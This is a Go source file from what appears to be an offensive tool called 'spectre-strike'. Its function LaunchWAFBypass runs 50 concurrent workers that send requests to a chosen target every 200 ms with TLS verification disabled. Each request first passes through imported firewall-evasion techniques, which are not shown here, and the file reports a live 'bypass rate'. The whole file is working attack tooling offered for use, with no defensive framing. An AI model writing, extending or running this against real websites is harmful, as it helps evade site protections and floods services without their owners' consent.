package attacks

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sync"
	"sync/atomic"
	"time"

	"spectre-strike/pkg/waf"

	"github.com/fatih/color"
)

type WAFBypassConfig struct {
	Target   string
	Duration time.Duration
	WAFType  string
}

type bypassStats struct {
	requests   int64
	successful int64
	blocked    int64
}

func LaunchWAFBypass(config WAFBypassConfig) error {
	parsedURL, err := url.Parse(config.Target)
	if err != nil {
		return fmt.Errorf("invalid URL: %v", err)
	}

	stats := &bypassStats{}
	done := make(chan bool)
	var wg sync.WaitGroup

	// Start statistics reporter
	go reportBypassStats(stats, config.Duration)

	// Launch bypass threads
	for i := 0; i < 50; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			performBypassAttack(parsedURL, config.WAFType, stats, done)
		}()
	}

	// Wait for duration
	time.Sleep(config.Duration)
	close(done)
	wg.Wait()

	return nil
}

func performBypassAttack(parsedURL *url.URL, wafType string, stats *bypassStats, done chan bool) {
	client := &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:    100,
			IdleConnTimeout: 90 * time.Second,
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Don't follow redirects
		},
	}

	ticker := time.NewTicker(200 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			atomic.AddInt64(&stats.requests, 1)

			req, err := http.NewRequest("GET", parsedURL.String(), nil)
			if err != nil {
				continue
			}

			// Apply WAF bypass techniques
			waf.ApplyBypassTechniques(req, wafType, parsedURL.Host)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()

			// Check if we bypassed WAF
			if resp.StatusCode == 403 || resp.StatusCode == 429 {
				atomic.AddInt64(&stats.blocked, 1)
			} else if resp.StatusCode >= 200 && resp.StatusCode < 400 {
				atomic.AddInt64(&stats.successful, 1)
			}
		}
	}
}

func reportBypassStats(stats *bypassStats, duration time.Duration) {
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	startTime := time.Now()
	lastRequests := int64(0)

	for range ticker.C {
		elapsed := time.Since(startTime)
		if elapsed >= duration {
			break
		}

		requests := atomic.LoadInt64(&stats.requests)
		successful := atomic.LoadInt64(&stats.successful)
		blocked := atomic.LoadInt64(&stats.blocked)

		rps := float64(requests-lastRequests) / 3.0
		lastRequests = requests

		bypassRate := 0.0
		if requests > 0 {
			bypassRate = float64(successful) / float64(requests) * 100
		}

		remaining := duration - elapsed

		if bypassRate > 50 {
			color.Green("   📊 RPS: %.0f | Success: %d | Blocked: %d | Bypass Rate: %.1f%% | Time: %s",
				rps, successful, blocked, bypassRate, remaining.Round(time.Second))
		} else {
			color.Yellow("   📊 RPS: %.0f | Success: %d | Blocked: %d | Bypass Rate: %.1f%% | Time: %s",
				rps, successful, blocked, bypassRate, remaining.Round(time.Second))
		}
	}
}
